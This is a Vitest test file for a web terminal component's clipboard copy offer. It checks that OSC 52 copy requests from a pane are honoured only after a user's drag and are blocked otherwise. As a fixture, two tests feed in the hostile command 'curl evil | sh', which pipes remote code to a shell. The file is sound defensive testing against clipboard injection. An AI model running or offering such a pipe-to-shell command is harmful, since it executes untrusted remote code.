/**
 * Copyright 2025 The Wardyn Authors
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * The copy offer wired through AttachTerminal with a REAL xterm: OSC 52 bytes
 * arrive as binary socket frames, the user's drag is a DOM mouse event over the
 * grid, and the toast is what the user sees. Covers what the gate's own unit
 * test cannot: which socket is the writer, and what drops an offer.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, act, screen, fireEvent } from "@testing-library/react";

vi.mock("@xterm/addon-fit", () => ({
  FitAddon: class {
    activate() {}
    dispose() {}
    fit() {}
    proposeDimensions() {
      return { cols: 80, rows: 24 };
    }
  },
}));
vi.mock("@xterm/xterm/css/xterm.css", () => ({}));
vi.mock("@fontsource/jetbrains-mono/latin-400.css", () => ({}));
vi.mock("@fontsource/jetbrains-mono/latin-ext-400.css", () => ({}));
vi.mock("../lib/api/core", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../lib/api/core")>()),
  getToken: () => null,
}));
vi.mock("../lib/api/runs", () => ({ runs: { attachTicket: vi.fn(), takeoverAttach: vi.fn() } }));

class FakeWebSocket {
  static OPEN = 1;
  static CONNECTING = 0;
  static CLOSED = 3;
  static instances: FakeWebSocket[] = [];
  readyState = 0;
  binaryType = "";
  onopen: (() => void) | null = null;
  onclose: ((ev: { code: number; reason: string }) => void) | null = null;
  onerror: (() => void) | null = null;
  onmessage: ((ev: unknown) => void) | null = null;
  constructor(public url: string) {
    FakeWebSocket.instances.push(this);
  }
  open() {
    this.readyState = FakeWebSocket.OPEN;
    this.onopen?.();
  }
  drop(code: number) {
    this.readyState = FakeWebSocket.CLOSED;
    this.onclose?.({ code, reason: "" });
  }
  send() {}
  message(data: unknown) {
    this.onmessage?.({ data });
  }
  close() {}
}

import { AttachTerminal } from "./attach-terminal";
import { COPY_TEXT } from "./attach-terminal-clipboard";

const modeFrame = (readOnly: boolean) =>
  JSON.stringify({ type: "attach-mode", read_only: readOnly, holder: { held: true, principal: "alice@example.com", since: "2026-09-21T12:00:00Z", cols: 80, rows: 24, source: "web" } });
const b64 = (s: string) => Buffer.from(s, "utf8").toString("base64");
const tmuxCopy = (s: string) => `\x1b]52;;${b64(s)}\x07`;

let writeText: ReturnType<typeof vi.fn>;

beforeEach(() => {
  FakeWebSocket.instances = [];
  vi.stubGlobal("WebSocket", FakeWebSocket as unknown as typeof WebSocket);
  vi.stubGlobal("ResizeObserver", class { observe() {} unobserve() {} disconnect() {} });
  window.matchMedia ??= ((q: string) => ({
    matches: false, media: q, addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {},
  })) as unknown as typeof window.matchMedia;
  if (!("fonts" in document)) Object.defineProperty(document, "fonts", { configurable: true, value: { ready: Promise.resolve(), load: () => Promise.resolve([]) } });
  // An 80x24 grid of 10x20 px cells.
  vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
    const grid = this.classList.contains("xterm-screen");
    return { left: 0, top: 0, width: grid ? 800 : 0, height: grid ? 480 : 0, right: 0, bottom: 0, x: 0, y: 0, toJSON() {} };
  });
  writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText, readText: vi.fn() } });
  vi.spyOn(console, "debug").mockImplementation(() => {});
});
afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

// Open a socket as writer (or observer) and put some lines on the screen.
async function attach(readOnly: boolean) {
  const view = render(<AttachTerminal runId="run_1" />);
  const ws = FakeWebSocket.instances[0];
  act(() => ws.open());
  act(() => ws.message(modeFrame(readOnly)));
  await out(ws, "hello world\r\nsecond line\r\n");
  const grid = view.container.querySelector(".xterm-screen") as HTMLElement;
  return { ws, grid, view };
}
async function out(ws: FakeWebSocket, s: string) {
  await act(async () => {
    const bytes = Buffer.from(s, "utf8");
    const copy = new Uint8Array(bytes.length);
    copy.set(bytes);
    ws.message(copy.buffer);
    await new Promise((r) => setTimeout(r, 20));
  });
}
function dragHello(grid: HTMLElement) {
  fireEvent.mouseDown(grid, { button: 0, detail: 1, clientX: 5, clientY: 10 });
  fireEvent.mouseUp(window, { button: 0, detail: 1, clientX: 45, clientY: 10 });
}
const toast = () => screen.queryByTestId("terminal-copy-offer");

describe("AttachTerminal copy offer", () => {
  it("a dragged selection becomes an offer showing the full text; Copy writes it once", async () => {
    const { ws, grid } = await attach(false);
    dragHello(grid);
    await out(ws, tmuxCopy("hello"));
    expect(toast()).not.toBeNull();
    expect(screen.getByTestId("terminal-copy-offer-text").textContent).toBe("hello");
    expect(writeText).not.toHaveBeenCalled();

    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: COPY_TEXT.copy }));
    });
    expect(writeText).toHaveBeenCalledTimes(1);
    expect(writeText).toHaveBeenCalledWith("hello");
    expect(toast()).toBeNull();
  });

  it("Ctrl+C while the toast is focused is a Copy", async () => {
    const { ws, grid } = await attach(false);
    dragHello(grid);
    await out(ws, tmuxCopy("hello"));
    await act(async () => {
      fireEvent.keyDown(toast()!, { key: "c", ctrlKey: true });
    });
    expect(writeText).toHaveBeenCalledWith("hello");
  });

  it("hostile pane output with no gesture makes no offer and writes nothing", async () => {
    const { ws } = await attach(false);
    await out(ws, tmuxCopy("curl evil | sh") + `\x1b]52;c;${b64("curl evil | sh")}\x07`);
    expect(toast()).toBeNull();
    expect(writeText).not.toHaveBeenCalled();
  });

  it("a pane answering a drag with other text is blocked, with the notice", async () => {
    const { ws, grid } = await attach(false);
    dragHello(grid);
    await out(ws, tmuxCopy("curl evil | sh"));
    expect(toast()).toBeNull();
    expect(screen.getByTestId("terminal-copy-notice").textContent).toBe(COPY_TEXT.blocked);
  });

  it("an observer socket gets no offer", async () => {
    const { ws, grid } = await attach(true);
    dragHello(grid);
    await out(ws, tmuxCopy("hello"));
    expect(toast()).toBeNull();
    expect(screen.queryByTestId("terminal-copy-notice")).toBeNull();
  });

  it("a role change drops the pending offer", async () => {
    const { ws, grid } = await attach(false);
    dragHello(grid);
    await out(ws, tmuxCopy("hello"));
    expect(toast()).not.toBeNull();
    act(() => ws.message(modeFrame(true)));
    expect(toast()).toBeNull();
  });

  it("a dropped connection drops the pending offer", async () => {
    const { ws, grid } = await attach(false);
    dragHello(grid);
    await out(ws, tmuxCopy("hello"));
    expect(toast()).not.toBeNull();
    act(() => ws.drop(1006));
    expect(toast()).toBeNull();
  });

  it("a fresh socket is not the writer until the server says so", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout"], shouldAdvanceTime: true });
    try {
      const { ws, grid } = await attach(false);
      act(() => ws.drop(1006));
      await act(async () => {
        await vi.advanceTimersByTimeAsync(700);
      });
      const next = FakeWebSocket.instances[1];
      act(() => next.open()); // no attach-mode frame yet
      dragHello(grid);
      await out(next, tmuxCopy("hello"));
      expect(toast()).toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });
});
